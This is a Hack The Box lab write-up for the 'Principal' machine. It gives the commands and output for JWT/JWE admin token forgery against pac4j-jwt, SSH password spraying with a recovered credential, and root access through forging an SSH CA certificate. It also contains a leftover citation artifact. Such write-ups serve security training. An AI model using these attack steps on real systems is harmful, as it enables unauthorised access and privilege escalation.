````markdown
# Hack The Box - Principal

## Summary

Principal is a medium-difficulty Linux machine focused on misplaced cryptographic trust. The initial compromise abused an authentication bypass in `pac4j-jwt/6.0.3`, where an unsigned `PlainJWT` could be wrapped inside a valid encrypted JWE envelope. Because the server validated the encrypted envelope but failed to validate the identity claims inside the inner JWT, an administrator token could be forged.

After gaining administrator access to the internal dashboard, a deployment-related SSH password was recovered and password spraying identified the valid SSH user `svc-deploy`. Privilege escalation then abused a misconfigured SSH Certificate Authority setup. The `svc-deploy` user belonged to the `deployers` group and could read the SSH CA private key. Since the server trusted the CA public key without restricting valid principals, a new SSH certificate was forged for the `root` principal, allowing root login via SSH certificate authentication. :contentReference[oaicite:0]{index=0}

---

## Target Information

| Item | Value |
|---|---|
| Machine | Principal |
| Platform | Linux |
| Difficulty | Medium |
| Target IP | `10.129.244.220` |
| Hostname | `principal.htb` |
| Initial Access | pac4j-jwt authentication bypass |
| Privilege Escalation | SSH CA certificate forgery |

---

# 1. Enumeration

## 1.1 TCP Port Discovery

A full TCP port scan identified two open ports: SSH on `22/tcp` and a Jetty web application on `8080/tcp`.

```bash
nmap -p- --min-rate 5000 -Pn 10.129.244.220 -oN scans/tcp-full.txt
````

## 1.2 Service and Version Enumeration

```bash
nmap -sC -sV -Pn -p 22,8080 10.129.244.220 -oN scans/tcp-services.txt
```

Relevant result:

```text
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
8080/tcp open  http-proxy Jetty
```

The web service exposed the following technology indicator:

```text
X-Powered-By: pac4j-jwt/6.0.3
```

This was immediately interesting because the box theme and service fingerprint pointed toward a JWT/JWE authentication issue. The official writeup also identifies `pac4j-jwt/6.0.3` as the key foothold indicator. 

---

# 2. Web Application Enumeration

## 2.1 Accessing the Web Application

The web service redirected to a login page:

```bash
curl -i http://10.129.244.220:8080/
```

The application was identified as:

```text
Principal Internal Platform - Login
```

The login form submitted authentication requests to:

```text
/api/auth/login
```

## 2.2 JavaScript Review

The application JavaScript was reviewed:

```bash
curl -s http://10.129.244.220:8080/static/js/app.js -o enum/web/app.js
grep -Ei "jwks|dashboard|users|settings|auth|login|token|role" enum/web/app.js
```

Interesting endpoints were identified:

```text
/api/auth/login
/api/auth/jwks
/api/dashboard
/api/users
/api/settings
```

The JavaScript disclosed that the application used encrypted JWT tokens and that a public key was available from the JWKS endpoint. The official writeup confirms that `/api/auth/jwks` exposes the RSA public key used for JWE encryption. 

## 2.3 JWKS Retrieval

```bash
curl -s http://10.129.244.220:8080/api/auth/jwks | jq
```

The endpoint returned an RSA public key with key ID:

```text
enc-key-1
```

This key was used to encrypt a forged JWE token.

---

# 3. Initial Access

## 3.1 Vulnerability Overview

The application used `pac4j-jwt/6.0.3`, which was vulnerable to CVE-2026-29000. The issue occurs when the server decrypts a valid JWE envelope but fails to enforce signature verification on the inner JWT if the inner token is a `PlainJWT` using `alg: none`.

The attack flow was:

```text
1. Retrieve RSA public key from /api/auth/jwks.
2. Create an unsigned PlainJWT with admin claims.
3. Wrap the PlainJWT inside a valid JWE envelope.
4. Send the forged token as a Bearer token.
5. Access administrator API endpoints.
```

The core weakness was that the application validated the encrypted wrapper but failed to validate the identity claims inside it. 

## 3.2 Token Forgery Script

A Python virtual environment was used to avoid modifying Kali’s system Python environment.

```bash
cd /home/zendeni/htb_labs/principal
python3 -m venv venv
source venv/bin/activate
pip install jwcrypto requests
```

The token forgery script was saved as:

```text
exploits/jwt.py
```

Execution:

```bash
cd /home/zendeni/htb_labs/principal/exploits
export TARGET=http://10.129.244.220:8080
python3 jwt.py "$TARGET" | tee forged-token.txt
```

The script successfully generated a forged admin JWE token and verified access to:

```text
/api/dashboard
```

## 3.3 Accessing Protected API Endpoints

The forged token was stored in a shell variable:

```bash
TOKEN='<forged_jwe_token>'
```

Protected endpoints were queried directly:

```bash
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/dashboard" | jq
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/users" | jq
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/settings" | jq
```

The administrator API access exposed the user list and a deployment-related SSH password.

Recovered password:

```text
D3pl0y_$$H_Now42!
```

---

# 4. Credential Reuse and SSH Access

## 4.1 User List Preparation

A username list was prepared from the discovered users:

```bash
cat > users.txt <<'EOF'
admin
svc-deploy
jthompson
amorales
twright
kkumar
awilson
lzhang
EOF
```

## 4.2 SSH Password Spray

The recovered password was tested against SSH:

```bash
PASS='D3pl0y_$$H_Now42!'
nxc ssh 10.129.244.220 -u users.txt -p "$PASS"
```

A valid login was identified:

```text
svc-deploy:D3pl0y_$$H_Now42!
```

The official writeup confirms that `svc-deploy` reused the recovered deployment password for SSH access. 

## 4.3 SSH Login

```bash
ssh svc-deploy@10.129.244.220
```

Password:

```text
D3pl0y_$$H_Now42!
```

Post-login validation:

```bash
id
hostname
cat ~/user.txt
```

The user belonged to the `deployers` group:

```text
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
```

---

# 5. Privilege Escalation

## 5.1 Local Enumeration

The user’s group membership led to the `/opt/principal/ssh` directory:

```bash
ls -la /opt/principal/ssh
cat /opt/principal/ssh/README.txt
```

Relevant files:

```text
/opt/principal/ssh/README.txt
/opt/principal/ssh/ca
/opt/principal/ssh/ca.pub
```

The private CA key was readable by members of the `deployers` group.

The SSH daemon configuration was reviewed:

```bash
cat /etc/ssh/sshd_config.d/60-principal.conf
```

Relevant configuration:

```text
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

The server trusted the CA public key for SSH user certificates. However, there was no `AuthorizedPrincipalsFile` or `AuthorizedPrincipalsCommand` limiting which principals could be used. Because the CA private key was readable, a certificate could be signed for the `root` principal. The official writeup identifies this exact SSH CA trust misconfiguration as the privilege escalation vector. 

## 5.2 SSH Certificate Forgery

A new SSH keypair was generated on the target:

```bash
ssh-keygen -t ed25519 -f /tmp/pwn -N ""
```

The public key was signed using the readable CA private key, specifying `root` as the valid principal:

```bash
ssh-keygen -s /opt/principal/ssh/ca -I "pwn-root" -n root -V +1h /tmp/pwn.pub
```

This created:

```text
/tmp/pwn-cert.pub
```

The certificate was verified:

```bash
ssh-keygen -L -f /tmp/pwn-cert.pub
```

Expected principal:

```text
Principals:
        root
```

## 5.3 Root Login

Using the forged certificate, root login was performed locally:

```bash
ssh -i /tmp/pwn root@localhost
```

Root access was confirmed:

```bash
id
hostname
cat /root/root.txt
```

Result:

```text
uid=0(root) gid=0(root) groups=0(root)
```

---

# 6. Attack Chain Summary

```text
1. Performed full TCP port discovery.
2. Identified SSH on 22/tcp and Jetty web application on 8080/tcp.
3. Observed pac4j-jwt/6.0.3 in HTTP headers.
4. Reviewed JavaScript and discovered authentication/API endpoints.
5. Retrieved RSA public key from /api/auth/jwks.
6. Forged an unsigned admin PlainJWT and wrapped it in a valid JWE envelope.
7. Used the forged Bearer token to access administrator API endpoints.
8. Recovered user list and deployment-related SSH password.
9. Sprayed SSH and identified valid credentials for svc-deploy.
10. Logged in over SSH as svc-deploy.
11. Found svc-deploy was a member of the deployers group.
12. Read the SSH CA private key from /opt/principal/ssh/ca.
13. Confirmed sshd trusted /opt/principal/ssh/ca.pub via TrustedUserCAKeys.
14. Generated a new SSH keypair and signed it with root as the certificate principal.
15. Used the forged SSH certificate to authenticate as root.
```

---

# 7. MITRE ATT&CK Mapping

| Phase                              | Technique                          | ID        |
| ---------------------------------- | ---------------------------------- | --------- |
| Reconnaissance                     | Active Scanning                    | T1595     |
| Discovery                          | Network Service Discovery          | T1046     |
| Discovery                          | File and Directory Discovery       | T1083     |
| Initial Access                     | Exploit Public-Facing Application  | T1190     |
| Credential Access                  | Unsecured Credentials              | T1552     |
| Credential Access                  | Credentials from Web Services      | T1555     |
| Lateral Movement / Initial Shell   | Remote Services: SSH               | T1021.004 |
| Privilege Escalation               | Valid Accounts                     | T1078     |
| Privilege Escalation               | Abuse Elevation Control Mechanism  | T1548     |
| Defense Evasion                    | Subvert Trust Controls             | T1553     |
| Persistence / Privilege Escalation | SSH Authorized Keys / Certificates | T1098.004 |

---
